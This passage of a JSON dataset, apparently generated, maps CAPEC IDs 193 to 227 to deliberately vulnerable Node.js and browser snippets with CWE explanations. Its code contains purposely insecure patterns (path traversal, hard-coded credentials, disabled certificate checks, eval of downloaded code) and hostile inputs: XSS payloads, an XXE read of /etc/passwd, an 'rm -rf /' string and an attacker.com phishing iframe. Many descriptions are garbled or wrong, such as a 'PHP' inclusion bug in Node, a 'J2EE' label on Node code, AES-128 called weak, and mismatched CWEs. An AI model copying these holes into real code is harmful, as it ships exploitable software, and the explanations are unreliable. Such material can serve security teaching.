        "description": "This code snippet demonstrates the CAPEC of deciphering and decoding protocol information for a network or application communication protocol. It uses a weak encryption algorithm (AES-128-CBC) with a weak password, which is vulnerable to brute-force attacks (CWE-326). The sensitive data is transmitted in cleartext over the network, making it vulnerable to sniffing attacks (CWE-319). The code also uses a less-secure algorithm for encryption, which can be downgraded by an attacker (CWE-757). Additionally, the code makes assumptions about the memory layout of the data, which can result in unintended program behavior (CWE-188). Finally, the code does not properly convert security identifiers, making it vulnerable to unauthorized access (CWE-1292)."
    },
    {
        "capec_id": "193",
        "code_snippet": "const express = require('express');\nconst app = express();\napp.get('/include', (req, res) => {\n  const file = req.query.file;\n  const fs = require('fs');\n  fs.readFile(file, (err, data) => {\n    if (err) {\n      res.status(404).send('File not found');\n    } else {\n      res.send(data);\n    }\n  });\n});\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a PHP Remote File Inclusion vulnerability (CWE-98) in a Node.js application. The 'file' parameter in the GET request is not properly sanitized, allowing an attacker to include and execute arbitrary files. This can lead to Remote Code Execution (RCE) and other security issues. The code also has implications of CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page) as it does not properly handle user input, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) as it trusts the file extension, CWE-433 (Unparsed Raw Web Content Delivery) as it serves raw content, and CWE-553 (Command Shell in Externally Accessible Directory) as it allows access to sensitive directories."
    },
    {
        "capec_id": "194",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/sendEmail', (req, res) => {\n  const sender = req.body.sender;\n  const recipient = req.body.recipient;\n  const message = req.body.message;\n\n  // CWE-287: Improper Authentication\n  // No authentication or verification of the sender's identity\n  const mailOptions = {\n    from: sender,\n    to: recipient,\n    subject: 'Test Email',\n    text: message\n  };\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  // No verification of the request origin\n  const transporter = nodemailer.createTransport({\n    host: 'smtp.example.com',\n    port: 587,\n    secure: false\n  });\n\n  transporter.sendMail(mailOptions, (error, info) => {\n    if (error) {\n      return console.log(error);\n    }\n    console.log('Email sent: ' + info.response);\n    res.send('Email sent successfully');\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable email sending functionality in a Node.js application. It lacks proper authentication and verification of the sender's identity, allowing an attacker to spoof the 'From' field and send emails on behalf of another user. The code also fails to verify the origin of the incoming request, making it vulnerable to attacks from unauthorized sources."
    },
    {
        "capec_id": "195",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const isAdmin = req.body.isAdmin;\n\n  if (username === 'admin' && password === 'password') {\n    res.cookie('isAdmin', isAdmin, { httpOnly: true });\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const isAdmin = req.cookies.isAdmin;\n  if (isAdmin === 'true') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a Principal Spoof attack, where an adversary can impersonate an administrator by sending a malicious request with a fake isAdmin cookie. The code has multiple vulnerabilities, including CWE-290 (Authentication Bypass by Spoofing), CWE-1390 (Weak Authentication), CWE-301 (Reflection Attack in an Authentication Protocol), CWE-941 (Incorrectly Specified Destination in a Communication Channel), and CWE-322 (Key Exchange without Entity Authentication). The code does not properly verify the user's identity, allowing an attacker to bypass authentication and access restricted areas."
    },
    {
        "capec_id": "196",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'weak_secret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'default_password') {\n    req.session.username = username;\n    res.send('Logged in successfully!');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable session management system. It uses a weak secret for session encryption (CWE-1391), does not invalidate existing session identifiers (CWE-384), and does not properly control the session resource throughout its lifetime (CWE-664). Additionally, it does not use secure transport for credentials (CWE-523) and does not expire sessions (CWE-613). An attacker can forge a valid session credential by guessing the weak secret, reusing an existing session ID, or intercepting the unencrypted session cookie."
    },
    {
        "capec_id": "197",
        "code_snippet": "const xml = `<!ENTITY a '<!ENTITY b '&#60;!ENTITY c '&#60;!ENTITY d '&#60;!ENTITY e '&#60;!ENTITY f '&#60;!ENTITY g '&#60;!ENTITY h '&#60;!ENTITY i '&#60;!ENTITY j '&#60;!ENTITY k '&#60;!ENTITY l '&#60;!ENTITY m '&#60;!ENTITY n '&#60;!ENTITY o '&#60;!ENTITY p '&#60;!ENTITY q '&#60;!ENTITY r '&#60;!ENTITY s '&#60;!ENTITY t '&#60;!ENTITY u '&#60;!ENTITY v '&#60;!ENTITY w '&#60;!ENTITY x '&#60;!ENTITY y '&#60;!ENTITY z '&#60;]>';\n\nconst parser = new DOMParser();\nconst xmlDoc = parser.parseFromString(xml, 'application/xml');",
        "description": "This JavaScript code snippet demonstrates the concept of XML Entity Expansion, which can lead to excessive memory allocation and CPU usage. The code defines a malicious XML string with nested entity references, which can cause an exponential growth in memory demands when parsed. This is an example of CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')."
    },
    {
        "capec_id": "198",
        "code_snippet": "const userInput = '<script>alert(\"XSS\")</script>'; const errorPage = `Error occurred: ${userInput}`; document.write(errorPage);",
        "description": "This code snippet demonstrates a vulnerable error page that reflects user input without proper neutralization, allowing an attacker to inject malicious script code. The userInput variable contains a malicious script tag, which is then concatenated into the errorPage string without being sanitized. The document.write function is then used to write the errorPage to the HTML document, causing the malicious script to be executed."
    },
    {
        "capec_id": "199",
        "code_snippet": "const userInput = '<ScRiPt>alert(\"XSS\")</ScRiPt>'; const filter = /<script>/i; if (!userInput.match(filter)) { document.write(userInput); }",
        "description": "This code snippet demonstrates the CAPEC of using alternate forms of keywords or commands to bypass filters. The userInput variable contains a script tag with an alternate case structure (ScRiPt) that may not be caught by the filter. The filter uses a regular expression with the 'i' flag to make the match case-insensitive, but it only checks for the exact keyword 'script', allowing the alternate form to bypass the filter. This code is vulnerable to CWE-87: Improper Neutralization of Alternate XSS Syntax, CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS), CWE-692: Incomplete Denylist to Cross-Site Scripting, and CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine."
    },
    {
        "capec_id": "200",
        "code_snippet": "const userInput = \"<script>alert('XSS')</script>\";\nconst unsafeFilter = (input) => {\n  const allowedTags = ['<p>', '<br>'];\n  for (let i = 0; i < allowedTags.length; i++) {\n    input = input.replace(allowedTags[i], '');\n  }\n  return input;\n};\nconst filteredInput = unsafeFilter(userInput);\ndocument.body.innerHTML = filteredInput;",
        "description": "This code snippet demonstrates the CAPEC of removing or disabling filtering mechanisms. The CWEs embodied in this code include CWE-20 (Improper Input Validation), CWE-184 (Incomplete List of Disallowed Inputs), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-182 (Collapse of Data into Unsafe Value), and CWE-707 (Improper Neutralization). The code allows an attacker to inject malicious script tags, bypassing the incomplete and improper filtering mechanism."
    },
    {
        "capec_id": "201",
        "code_snippet": "const XmlHttpRequest = require('xmlhttprequest');\nconst fs = require('fs');\nconst xml = `<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>`;\nconst parser = require('xml2js').Parser({explicitArray: false});\nparser.parseString(xml, (err, result) => {\n  console.log(result);\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of creating a malicious serialized data file with an external data reference. The code uses an XML parser to parse a malicious XML document that contains an external entity reference to the system's /etc/passwd file. The parser does not validate the document with the external reference, allowing the adversary to access arbitrary files on the system. This code embodies CWEs 611, 502, and 829."
    },
    {
        "capec_id": "202",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://example.com/api/protectedResource', true);\nxhr.setRequestHeader('Authorization', 'Bearer ' + 'fakeToken');\nxhr.send();",
        "description": "A malicious client-side JavaScript code snippet that bypasses server-side authentication by sending a fake authentication token, violating the server's assumption that the client will implement authentication checks. This code exploits CWE-603 (Use of Client-Side Authentication) and CWE-507 (Trojan Horse) by hiding malicious code within a seemingly benign client application, and CWE-506 (Embedded Malicious Code) by containing code that appears malicious in nature. It also relates to CWE-1229 (Creation of Emergent Resource) as it creates an unauthorized resource access. Finally, it demonstrates CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to implement a mechanism that is intended to protect the server."
    },
    {
        "capec_id": "203",
        "code_snippet": "const reg = require('registry');\n\n// CWE-15: External Control of System or Configuration Setting\nreg.set('HKCU\\Software\\MyApp\\Config', 'allowSpoofing', 'true');\n\n// CWE-314: Cleartext Storage in the Registry\nreg.set('HKCU\\Software\\MyApp\\Credentials', 'username', 'admin');\nreg.set('HKCU\\Software\\MyApp\\Credentials', 'password', 'password123');\n\n// CWE-1231: Improper Prevention of Lock Bit Modification\nreg.set('HKCU\\Software\\MyApp\\Security', 'lockBit', '0');\n\n// CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\nconst sensitiveData = reg.get('HKCU\\Software\\MyApp\\SensitiveData');\nconsole.log(sensitiveData);\n\n// CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\nconst encryptedInput = reg.get('HKCU\\Software\\MyApp\\EncryptedInput');\nconst decryptedInput = decrypt(encryptedInput);\nconsole.log(decryptedInput);\n",
        "description": "JavaScript code snippet demonstrating the CAPEC of exploiting weaknesses in authorization to modify registry content, including CWE-15, CWE-314, CWE-1231, CWE-1422, and CWE-649."
    },
    {
        "capec_id": "204",
        "code_snippet": "const cache = window.localStorage;\n\nfunction performSensitiveCalculation() {\n  const sensitiveData = 'secretKey:'+generateSecretKey();\n  cache.setItem('calcResult', sensitiveData);\n  return sensitiveData;\n}\n\nfunction generateSecretKey() {\n  return Math.random().toString(36).substr(2);\n}\n\nperformSensitiveCalculation();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of an adversary examining a target application's cache for sensitive information. The code uses the browser's local storage as a cache and stores sensitive information (a secret key) without encryption (CWE-311). The cache is not properly protected, allowing an attacker to browse the cache and retrieve the sensitive information (CWE-524, CWE-525)."
    },
    {
        "capec_id": "205",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  \n  // CWE-522: Insufficiently Protected Credentials\n  // Storing credentials in plaintext\n  const credentials = {\n    username: username,\n    password: password\n  };\n  \n  // CWE-603: Use of Client-Side Authentication\n  // Authentication check on client-side only\n  if (username === 'admin' && password === 'password') {\n    res.send('Authenticated!');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable authentication system that stores credentials in plaintext (CWE-522) and performs authentication checks on the client-side only (CWE-603). An attacker can bypass authentication by modifying the client-side code to omit the authentication check or by intercepting and replaying the authentication request (CWE-294)."
    },
    {
        "capec_id": "206",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-798: Hard-coded credentials\nconst signingKey = '-----BEGIN RSA PRIVATE KEY-----\\\nMIIEogIBAAKCAQEArxX...\\\n-----END RSA PRIVATE KEY-----';\n\n// CWE-732: Incorrect permission assignment\nfs.chmodSync('/path/to/signing/key', '0777');\n\n// CWE-494: Download of code without integrity check\nconst downloadCode = (url) => {\n  const https = require('https');\n  https.get(url, (res) => {\n    let code = '';\n    res.on('data', (chunk) => {\n      code += chunk;\n    });\n    res.on('end', () => {\n      // CWE-506: Embedded malicious code\n      eval(code);\n    });\n  });\n};\n\n// CWE-603: Use of client-side authentication\nconst authenticate = (username, password) => {\n  if (username === 'admin' && password === 'password') {\n    return true;\n  }\n  return false;\n};\n\n// Main code\nconst signCode = (code) => {\n  const signer = crypto.createSign('SHA256');\n  signer.update(code);\n  signer.end();\n  const signature = signer.sign(signingKey);\n  return signature;\n};\n\nconst maliciousCode = 'const malicious = () => { console.log(\\'Malicious code executed\\'); }; malicious();';\nconst signature = signCode(maliciousCode);\nconsole.log(`Signed malicious code: ${signature}`);\n",
        "description": "This code snippet demonstrates the CAPEC where an adversary extracts credentials used for code signing from a production environment and uses them to sign malicious content. The code includes CWE-798 hard-coded credentials, CWE-732 incorrect permission assignment, CWE-494 download of code without integrity check, CWE-506 embedded malicious code, and CWE-603 use of client-side authentication. The code signs malicious code with the extracted signing key, allowing the adversary to execute arbitrary code on the victim's computer."
    },
    {
        "capec_id": "207",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://example.com/authenticatedResource', true); xhr.withCredentials = true; xhr.onload = function() { if (xhr.status === 200) { const response = JSON.parse(xhr.responseText); if (response.isAuthenticated) { // assume client-side authentication is successful, grant access to protected resource } }; xhr.send();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of removing or disabling client-side functionality that the server assumes to be present and trustworthy. Specifically, it relates to CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication). The code sends an AJAX request to a protected resource, assuming that the client-side authentication check has been successful. However, an adversary can modify the client-side code to bypass the authentication check, allowing unauthorized access to the protected resource. Additionally, the code does not verify the origin and integrity of the downloaded code, making it vulnerable to CWE-494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "208",
        "code_snippet": "function calculateTotalCost(price, quantity) {\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  // CWE-682: Incorrect Calculation\n  // CWE-1284: Improper Validation of Specified Quantity in Input\n  // CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n  // CWE-115: Misinterpretation of Input\n  var totalCost = price * quantity;\n  // attacker can modify the logic here to return incorrect values\n  if (getCookie('discount') === 'true') {\n    totalCost *= 0.1; // applying a fake discount\n  }\n  return totalCost;\n}\n\nfunction getCookie(name) {\n  var value = '; ' + document.cookie;\n  var parts = value.split('; ' + name + '=');\n  if (parts.length == 2) return parts.pop().split(';').shift();\n}\n\n// example usage\nvar price = 10.99;\nvar quantity = 2;\nvar totalCost = calculateTotalCost(price, quantity);\nconsole.log('Total cost: $' + totalCost.toFixed(2));",
        "description": "This JavaScript code snippet demonstrates the CAPEC where an attacker can modify the client-side logic for monetary calculations, resulting in incorrect information being sent to the server. The code calculates the total cost of an item based on its price and quantity, but an attacker can manipulate the calculation by modifying the cookie value or the logic within the calculateTotalCost function."
    },
    {
        "capec_id": "209",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.userInput;\n  const fileExtension = '.txt';\n  const fileName = 'userInput' + fileExtension;\n  const fileContent = '<script>alert(\"XSS\");</script>';\n\n  res.setHeader('Content-Disposition', 'attachment; filename=\"' + fileName + '\"');\n  res.setHeader('Content-Type', 'text/plain');\n  res.send(fileContent);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerability to Cross-Site Scripting (XSS) attacks by serving a file with a .txt extension but containing script content. The file is served with a Content-Type of 'text/plain', but some browsers may still execute the script due to MIME type confusion. The userInput variable is not properly validated, allowing an attacker to inject malicious script content. The file name and extension are also not properly validated, making it possible for an attacker to upload a file with a malicious extension."
    },
    {
        "capec_id": "211",
        "code_snippet": "var userInput = '<img src=\"x\" onerror=\"alert(1)\">';\nvar denylist = ['script', 'alert'];\nif (!denylist.some(function(keyword) {\n  return userInput.toLowerCase().includes(keyword);\n})) {\n  document.write(userInput);\n}",
        "description": "This code snippet demonstrates an incomplete denylist-based protection mechanism against XSS attacks, allowing an attacker to inject malicious script through an IMG tag's onerror attribute, which is not caught by the denylist."
    },
    {
        "capec_id": "212",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-1242: Inclusion of Undocumented Features or Chicken Bits\nconst undocumentedFeature = process.binding('undocumented_feature');\n\n// CWE-1246: Improper Write Handling in Limited-write Non-Volatile Memories\nconst limitedWriteMemory = require('limited-write-memory');\nlimitedWriteMemory.write('sensitive_data', 'unauthorized_access');\n\n// CWE-1281: Sequence of Processor Instructions Leads to Unexpected Behavior\nconst unexpectedBehavior = () => {\n  for (let i = 0; i < 1000000; i++) {\n    crypto.createHash('sha256').update('unauthorized_input').digest('hex');\n  }\n};\n\n// CWE-695: Use of Low-Level Functionality\nconst lowLevelFunctionality = process._rawDebug();\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst sensitiveSystemInfo = fs.readFileSync('/etc/passwd', 'utf8');\nconsole.log(sensitiveSystemInfo);\n\n// CAPEC: Legitimate functionality used in unintended ways\nconst legitimateFunctionality = () => {\n  undocumentedFeature();\n  limitedWriteMemory.write('sensitive_data', 'unauthorized_access');\n  unexpectedBehavior();\n  lowLevelFunctionality();\n  console.log(sensitiveSystemInfo);\n};\nlegitimateFunctionality();",
        "description": "This code snippet demonstrates the CAPEC of using legitimate functionality in unintended ways, leveraging CWEs such as inclusion of undocumented features, improper write handling, sequence of processor instructions leading to unexpected behavior, use of low-level functionality, and exposure of sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "213",
        "code_snippet": "const fs = require('fs');\n\nfunction getFile(userInput) {\n  const filePath = `./uploads/${userInput}`;\n  if (fs.existsSync(filePath)) {\n    return fs.readFileSync(filePath, 'utf8');\n  } else {\n    return 'File not found.';\n  }\n}\n\n// Vulnerable usage:\ngetFile('../secretfile.txt'); // Should not be accessible\ngetFile('....//secretfile.txt'); // Should not be accessible\ngetFile('.../...//secretfile.txt'); // Should not be accessible\ngetFile('/dir/../secretfile.txt'); // Should not be accessible",
        "description": "This JavaScript code snippet demonstrates a path traversal vulnerability. The getFile function takes user input to construct a file path, but it does not properly sanitize the input. This allows an attacker to traverse the file system and access restricted files by providing specially crafted input, such as '../', '....', '.../...//', or '/dir/../'."
    },
    {
        "capec_id": "214",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  try {\n    const socket = require('net').createSocket();\n    socket.connect(8080, 'localhost', () => {\n      console.log('Connected');\n    });\n    \n    // Direct use of sockets instead of using framework method calls\n    socket.on('data', (data) => {\n      console.log('Received data: ' + data);\n      res.send('Received data: ' + data);\n    });\n  } catch (err) {\n    // Missing custom error page, displaying sensitive information\n    res.status(500).send('Error: ' + err.message);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a J2EE application that directly uses sockets instead of using framework method calls (CWE-246), and also lacks a custom error page, displaying sensitive information about the product (CWE-7). Additionally, it does not use an input validation framework, increasing the risk of insufficient input validation (CWE-106). The code also uses dynamic class loading, which can lead to weaknesses related to insufficient input validation (CWE-545). The debug logs are not properly configured, potentially exposing sensitive information (CWE-534)."
    },
    {
        "capec_id": "215",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  try {\n    const userInput = req.query.input;\n    const data = JSON.parse(userInput);\n    res.send(data);\n  } catch (e) {\n    console.error(`Error parsing input: ${e.message}`);\n    res.status(500).send(`Error: ${e.message}`);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable API endpoint that is susceptible to fuzzing attacks. The endpoint accepts user input and attempts to parse it as JSON. If the input is malformed, an error is thrown and the error message is logged to the console and sent back to the user. An attacker could send random or malformed input to the endpoint and observe the error messages to gather sensitive information about the system or environment."
    },
    {
        "capec_id": "216",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/api/data', (req, res) => {\n  const data = req.body;\n  const userId = req.query.userId;\n  // No authentication or verification of the userId\n  if (userId === 'admin') {\n    // Critical function without authentication\n    res.send({ message: 'Admin access granted' });\n  } else {\n    // No message integrity check\n    res.send({ message: 'User access granted' });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable communication channel. The Express.js server does not perform authentication for the critical function of granting admin access, and it does not verify the source of the request or ensure the integrity of the message during transmission. An adversary can manipulate the 'userId' parameter to gain unauthorized access or inject malicious data into the communication stream."
    },
    {
        "capec_id": "217",
        "code_snippet": "const tls = require('tls');\nconst fs = require('fs');\n\nconst options = {\n  key: fs.readFileSync('server-key.pem'),\n  cert: fs.readFileSync('server-cert.pem'),\n  // Insecure configuration: no certificate verification\n  rejectUnauthorized: false\n};\n\nconst server = tls.createServer(options, (socket) => {\n  console.log('Server connected');\n  socket.write('Hello, client!');\n  socket.setEncoding('utf8');\n  socket.pipe(socket);\n});\n\nserver.listen(8000, () => {\n  console.log('Server bound');\n});\n\nconst clientOptions = {\n  key: fs.readFileSync('client-key.pem'),\n  cert: fs.readFileSync('client-cert.pem'),\n  // Insecure configuration: no certificate verification\n  rejectUnauthorized: false\n};\n\nconst client = tls.connect(8000, clientOptions, () => {\n  console.log('Client connected');\n  client.write('Hello, server!');\n});",
        "description": "This code snippet demonstrates a vulnerable SSL/TLS communication setup in a Node.js environment. The server and client configurations both have 'rejectUnauthorized' set to false, which disables certificate verification. This allows an adversary to intercept and inject malicious data into the encrypted stream, bypassing authentication and potentially compromising the client or server. The code also lacks proper verification of the communication channel, making it vulnerable to capture-replay attacks and improper restriction of communication channels."
    },
    {
        "capec_id": "218",
        "code_snippet": "const soap = require('soap');\nconst xmlParser = require('xml2js').parseString;\n\nconst uddiMessage = '<uddi:get_serviceDetail xmlns:uddi=\"http://www.uddi.org/wsdl\"><businessKey>valid_business_key</businessKey></uddi:get_serviceDetail>';\n\nconst client = new soap.Client('http://example.com/wsdl', {\n  rejectUnauthorized: false\n});\n\nclient.setSecurity(new soap.NS.SOAPFault);\n\nclient.get_serviceDetail(uddiMessage, function(err, result) {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable SOAP client that can be exploited by an attacker to impersonate a service provider in an e-business transaction. The code uses the 'soap' package to create a SOAP client and the 'xml2js' package to parse the UDDI message. The 'rejectUnauthorized' option is set to false, which disables certificate verification, allowing an attacker to spoof the UDDI message and impersonate a legitimate business. The code also lacks XML validation, making it vulnerable to XML injection attacks. Additionally, the code does not properly verify the authenticity of the data, does not specify the intended destination correctly, and does not ensure the integrity of the communication channel."
    },
    {
        "capec_id": "219",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmlparser = require('xml-parser');\nconst xpath = require('xpath');\nconst xmldoc = require('xmldoc');\n\napp.post('/processXml', (req, res) => {\n  const xmlString = req.body.xml;\n  const xmlDoc = xmlparser.parseFromString(xmlString);\n  const xpathExpr = xmlDoc.root().children[0].children[0].val();\n  const externalEntityUrl = xmlDoc.root().children[1].children[0].val();\n  const externalEntity = xmldoc.XmlDocument();\n  externalEntity.addDTD('!ENTITY ext SYSTEM \"' + externalEntityUrl + '\"');\n  xmlDoc.root().children[1].children[0].val(' &ext; ');\n  const result = xpath.select(xpathExpr, xmlDoc);\n  res.send(result);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable XML processing system that is susceptible to XML Routing Detour Attacks. The system accepts XML input from an untrusted source and does not validate it against a proper schema (CWE-112). It then uses the XML input to dynamically construct an XPath expression (CWE-643) and resolves an external entity reference (CWE-611) to an external URL. The system also acts as an unintended proxy or intermediary (CWE-441) by forwarding the XML processing to an external entity and altering the header information. An attacker can exploit this system by compromising an intermediate node in the XML processing route and modifying the responses to route the XML processing to nodes of their choice."
    },
    {
        "capec_id": "220",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\napp.get('/', (req, res) => {\n  const socket = new https.Socket();\n  socket.connect(443, 'example.com', () => {\n    // CWE-246: Direct use of sockets\n    socket.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n  });\n\n  // CWE-294: Authentication Bypass by Capture-replay\n  const capturedRequest = 'GET /protected HTTP/1.1\\r\\nHost: example.com\\r\\nAuthorization: Bearer captured_token\\r\\n\\r\\n';\n  socket.write(capturedRequest);\n\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  const clientSideValidation = (req) => {\n    if (req.headers['x-authenticated'] === 'true') {\n      return true;\n    }\n    return false;\n  };\n\n  if (clientSideValidation(req)) {\n    res.send('Authenticated');\n  } else {\n    res.send('Not Authenticated');\n  }\n\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n  const algorithms = ['AES-128-CBC', 'AES-256-CBC', 'DES-CBC'];\n  const selectedAlgorithm = algorithms[0];\n  console.log(`Selected algorithm: ${selectedAlgorithm}`);\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const destination = 'https://example.com/incorrect_destination';\n  https.get(destination, (res) => {\n    console.log(`Response from ${destination}: ${res.statusCode}`);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that embodies the main idea of the CAPEC. It includes multiple CWEs, including CWE-246 (direct use of sockets), CWE-294 (authentication bypass by capture-replay), CWE-602 (client-side enforcement of server-side security), CWE-757 (selection of less-secure algorithm during negotiation), and CWE-941 (incorrectly specified destination in a communication channel)."
    },
    {
        "capec_id": "221",
        "code_snippet": "const jsyaml = require('js-yaml');\nconst xmljs = require('xml-js');\n\nconst maliciousYaml = `--- !<entity>&exp;<!/entity>!exp system('rm -rf /'); !exp;`;\nconst maliciousXml = `<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY exp SYSTEM \"file:///dev/random\"> <document>&exp;</document>`;\n\ntry {\n  const yamlDoc = jsyaml.safeLoad(maliciousYaml);\n  console.log(yamlDoc);\n} catch (e) {\n  console.error(e);\n}\n\ntry {\n  const xmlDoc = xmljs.xml2js(maliciousXml, {compact: true});\n  console.log(xmlDoc);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This code snippet demonstrates a denial of service attack using XML and YAML entity replacement. The malicious YAML and XML files contain entities that reference external resources, which can cause the system to consume a large amount of resources, leading to a denial of service condition. The js-yaml and xml-js libraries are used to parse the YAML and XML files, respectively. The code attempts to load the malicious files, which can cause the system to crash or freeze."
    },
    {
        "capec_id": "222",
        "code_snippet": "<script>function loadIframe(){var iframe = document.createElement('iframe');iframe.src = 'https://attacker.com/phishing-page';iframe.frameBorder = '0';iframe.width = '100%';iframe.height = '100%';document.body.appendChild(iframe);}loadIframe();</script><img src='https://attacker.com/exploit' onmouseover='loadIframe()' />",
        "description": "This code snippet demonstrates an iFrame overlay attack. The attacker's phishing page is loaded in an iframe when the user hovers over the malicious image. The iframe is made to cover the entire page, making it seem like the user is interacting with the original page. CWE-1021: The iframe is not restricted, allowing it to overlay the original page. CWE-79: The onmouseover event is used to inject the malicious iframe. CWE-451: The phishing page is made to look like the original page, misrepresenting critical information to the user. CWE-368: The race condition occurs when the user is tricked into interacting with the phishing page while the original page is still loaded. CWE-82: The src attribute of the img tag is used to inject the malicious script."
    },
    {
        "capec_id": "224",
        "code_snippet": "const os = require('os');\nconst http = require('http');\n\nhttp.createServer((req, res) => {\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(`OS: ${os.type()} ${os.release()} ${os.arch()}\\n` +\n         `Node.js Version: ${process.version}\\n` +\n         `CPU Info: ${os.cpus()}\\n`);\n}).listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This code snippet creates an HTTP server that exposes sensitive system information, including the operating system type, release, architecture, Node.js version, and CPU information, to any client that connects to it. This is an example of fingerprinting, which can be used by an adversary to gather information about the target system and potentially identify vulnerabilities."
    },
    {
        "capec_id": "226",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    res.cookie('session_id', generateSessionId(), { httpOnly: true });\n    res.redirect('/protected');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  if (sessionId) {\n    // No validation or integrity checking of the session ID\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.status(401).send('Not authenticated');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable session management system. It uses cookies to store session IDs without proper validation or integrity checking (CWE-565). The session ID is generated and stored in a cookie without any expiration or regeneration (CWE-613). An attacker can manipulate the session ID to gain unauthorized access to the protected resource. Additionally, the code does not invalidate existing session IDs when a new user logs in, making it vulnerable to session fixation attacks (CWE-384)."
    },
    {
        "capec_id": "227",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/resource', (req, res) => {\n  const heavyResource = {};\n  for (let i = 0; i < 1000000; i++) {\n    heavyResource[i] = 'some heavy data';\n  }\n  res.json(heavyResource);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
